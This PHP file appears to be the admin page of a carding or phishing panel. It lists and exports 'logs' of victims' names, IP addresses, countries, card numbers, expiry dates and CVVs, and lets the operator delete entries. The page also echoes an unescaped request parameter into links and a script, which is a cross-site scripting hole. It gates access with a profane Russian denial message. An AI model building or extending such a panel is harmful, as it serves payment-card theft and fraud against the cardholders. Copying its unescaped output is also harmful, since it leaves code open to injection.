<?php
include_once __DIR__."/../../check_chmod.php";
if(!check_chmod_custom('logs')) exit('Идите пожалуйста нахуй отсюдава');

include_once __DIR__.'/../../../include/db/db_connect.php';


if(!empty($_GET['export'])){
   echo('<textarea rows="20" class="form-control">');
    foreach($db->getAll('SELECT * FROM logs WHERE 1') as $log){
        foreach ($log as $val)
            echo $val."|";
        echo '&#13;&#10;';
        
    }
    echo('</textarea>');
    exit;
}


?>



<script src="assets/js/chartkick.js"></script>
<script src="assets/js/loader.js"></script>





<div class="container mgt-30">
    <div class="col-md-12">
    <div class="box-standart">
    <div class="box-head" role="tab" id="headingOne">
     Logs
    </div>

    
      <div class="box-content">
        <a target="_blank" href='./?type=<?=$_GET['type']?>&page=logs&export=1'><button class="btn btn-sm btn-primary">EXPORT</button></a>
          
          <table  class="table table-hover table-tasks">
         <thead>
            <th>Date</th>
            <th>IP</th>
            <th>Country</th>
	    <th>Name</th>
            <th>Card</th>
            <th>Exp</th>
            <th>CVV</th>
            <th>Actions</th>
         </thead>
            
        <?php
          $per_page = 10;
          $cur_page = 1;
          if (isset($_GET['num_page']) && $_GET['num_page'] > 0)  $cur_page = $_GET['num_page'];
          $start = ($cur_page - 1) * $per_page;
          
            
            
       
            
          $tasks = $db->getAll("SELECT *  FROM logs  WHERE 1 ORDER BY id DESC LIMIT ?i, ?i", $start, $per_page);
          $db->getAll("SELECT id FROM logs WHERE 1");
          $rows = $db->getOne("SELECT FOUND_ROWS()"); 
          $num_pages = ceil($rows / $per_page);
          $page = 0;
          
            
          foreach($tasks as $task)
              
            
              echo "
              <tr>
                <td>{$task['date']}</td>
                <td>{$task['ip']}</td>
		<td>{$task['country']}</td>
                <td>{$task['fname']} {$task['lname']}</td>
                <td>{$task['card_num']}</td>
                <td>{$task['card_expm']}/{$task['card_expy']}</td>
                <td>{$task['card_cvv']}</td>
                <td>
                
                <button onclick='delete_log({$task['id']})' data-toggle='tooltip' data-placement='right' title='Delete log' class='btn btn-sm btn-danger'><i class='fa fa-trash'></i></button>
                </td>
              </tr>"
        ?>
        </table>
          
          
          
          
          
          
          
      </div>
    
    </div>
    </div>
</div>

<script>
function delete_log(id){
     if(confirm('Удалить запись?')){
    
        $('#modal-loading').modal({show:true,  backdrop: 'static', keyboard: false }); 
        $.post( "<?=$_GET['type']?>/ajax.php", { 
            type: 'delete_log',
            id: id
        })
         .done(function( data ) {
            $('#modal-loading').modal('hide');
            
            if(data == 'ok') show_success('Запись удалена, обновите страницу!');
            else show_error('Неизвесная ошибка.');
         });
    }
}
</script>
